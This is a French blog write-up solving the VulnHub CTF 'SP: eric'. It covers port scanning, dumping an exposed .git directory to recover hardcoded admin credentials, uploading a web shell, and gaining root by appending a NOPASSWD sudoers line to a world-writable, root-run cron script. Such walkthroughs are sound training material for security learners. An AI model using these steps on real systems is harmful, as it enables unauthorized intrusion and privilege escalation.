# Solution du CTF SP: Eric de VulnHub

Le CTF [SP: eric](https://www.vulnhub.com/entry/sp-eric,274/) proposé sur VulnHub m'aura occupé quelques minutes. Avec une bonne énumération et les bons outils il tombe vite.

```
Nmap scan report for 192.168.56.76
Host is up (0.00025s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d379153d114caf266cb2af6a0b9914fd (RSA)
|   256 8748763881c2a050cd4c39c07c7a0740 (ECDSA)
|_  256 8eb9dd8d149be3631dd70e54988d295b (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Blog under construction
| http-git: 
|   192.168.56.76:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: minor changes 
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

J'avais lancé en parallème un `feroxbuster` qui a remonté les fichiers suivants sur le port 80 :

```
200       15l       27w      306c http://192.168.56.76/admin.php
200       13l       38w      281c http://192.168.56.76/index.php
301        9l       28w      315c http://192.168.56.76/upload
```

Allons voir du côté de ce dossier *.git* avec [GitDump: A pentesting tool that dumps the source code from .git even when the directory traversal is disabled](https://github.com/Ebryx/GitDump) :

```shellsession
$ python3 git-dump.py 
Please provide website URL with /.git/ directory e.g. example.com/.git/
$ python3 git-dump.py  http://192.168.56.76/.git/
URL for test: http://192.168.56.76/.git/
Fetching: http://192.168.56.76/.git/index
Fetching: http://192.168.56.76/.git/FETCH_HEAD
Fetching: http://192.168.56.76/.git/HEAD
Fetching: http://192.168.56.76/.git/ORIG_HEAD
Fetching: http://192.168.56.76/.git/config
Fetching: http://192.168.56.76/.git/description
Fetching: http://192.168.56.76/.git/info/exclude
Fetching: http://192.168.56.76/.git/info/refs
Fetching: http://192.168.56.76/.git/logs/HEAD
Fetching: http://192.168.56.76/.git/logs/refs/heads/develop
Fetching: http://192.168.56.76/.git/logs/refs/heads/master
Fetching: http://192.168.56.76/.git/packed-refs
Fetching: http://192.168.56.76/.git/logs/refs/remotes/origin/develop
Fetching: http://192.168.56.76/.git/logs/refs/remotes/origin/master
Fetching: http://192.168.56.76/.git/logs/refs/remotes/origin/step_develop
Fetching: http://192.168.56.76/.git/refs/heads/develop
Fetching: http://192.168.56.76/.git/refs/heads/master
Fetching: http://192.168.56.76/.git/refs/remotes/origin/develop
Fetching: http://192.168.56.76/.git/refs/remotes/origin/master
Fetching: http://192.168.56.76/.git/refs/remotes/origin/step_develop
Fetching: http://192.168.56.76/.git/refs/remotes/github/master
Fetching: http://192.168.56.76/.git/objects/info/packs
Fetching: http://192.168.56.76/.git/logs/refs/remotes/github/master
Fetching: http://192.168.56.76/.git/refs/remotes/origin/HEAD
Parsing Index File
Fetching: http://192.168.56.76/.git/objects/cc/1ab96950f56d1fff0d1f006821cab6b6b0e249
Fetching: http://192.168.56.76/.git/objects/3d/b5628b550f5c9c9f6f663cd158374035a6eaa0
Fetching: http://192.168.56.76/.git/objects/23/448969d5b347f8e91f8017b4d8ef6edf6161d8
Fetching: http://192.168.56.76/.git/objects/a8/9a716b3c21d8f9fee38a0693afb22c75f1d31c
Fetching: http://192.168.56.76/.git/objects/00/00000000000000000000000000000000000000
Fetching: http://192.168.56.76/.git/objects/c0/951efcb330fc310911d714acf03b873aa9ab43
Fetching: http://192.168.56.76/.git/objects/f6/4fb0e9d514c96dd3debd4cdb2b80ba21951dec
Script Executed Successfully
Run following command to retrieve source code: cd output && git checkout -- .
$ cd output && git checkout -- .
$ ls
admin.php  index.php
```

La totalité de la logique du site est présente dans `admin.php`. Je vous en laisse un extrait seulement :

```php
if ($_POST['submit']) {
    if ($_POST['username'] == 'admin' && $_POST['password'] == 'st@mpch0rdt.ightiRu$glo0mappL3') {
        $_SESSION['auth'] = 1;
    } else {
        exit("Wrong username and/or password. Don't even bother bruteforcing.");
    }
}
```

L'accès à l'interface admin à l'aide de ces identifiants nous permet d'uploader un web shell vers le dossier `/upload`.

Après comme à mon habitude j'utiliser reverse-ssh pour avoir un shell avec PTY.

```shellsession
www-data@eric:/home/eric$ ls
total 64K
drwxr-xr-x 4 eric eric 4.0K Dec 20 16:27 .
drwxr-xr-x 3 root root 4.0K Oct 28  2018 ..
-rw------- 1 eric eric   81 Dec 23  2018 .bash_history
-rw-r--r-- 1 eric eric  220 Oct 28  2018 .bash_logout
-rw-r--r-- 1 eric eric 3.7K Oct 28  2018 .bashrc
drwx------ 2 eric eric 4.0K Oct 28  2018 .cache
drwxrwxr-x 3 eric eric 4.0K Oct 28  2018 .local
-rw-r--r-- 1 eric eric  807 Oct 28  2018 .profile
-rw-r--r-- 1 eric eric    0 Oct 28  2018 .sudo_as_admin_successful
-rwxrwxrwx 1 root root   55 Oct 28  2018 backup.sh
-rw-r--r-- 1 root root  24K Dec 20 13:27 backup.zip
-rw-r--r-- 1 root root   13 Oct 28  2018 flag.txt
www-data@eric:/home/eric$ cat flag.txt 
89340a834323
```

Le contenu du script bash est le suivant :

```bash
#!/bin/bash
zip -r /home/eric/backup.zip /var/www/html
```

Il est visiblement exécuté régulièrement avec les droits root car le `backup.zip` est récent.

Je rajoute la ligne suivante dans le script :

```bash
echo "www-data ALL=(ALL) NOPASSWD: /bin/bash" >> /etc/sudoers
```

et 3 minutes plus tard :

```shellsession
www-data@eric:/home/eric$ sudo /bin/bash
root@eric:/home/eric# id
uid=0(root) gid=0(root) groups=0(root)
root@eric:/home/eric# cd /root
root@eric:~# ls
flag.txt
root@eric:~# cat flag.txt
6a347b975dd18ae6497c
```

*Publié le 20 décembre 2022*
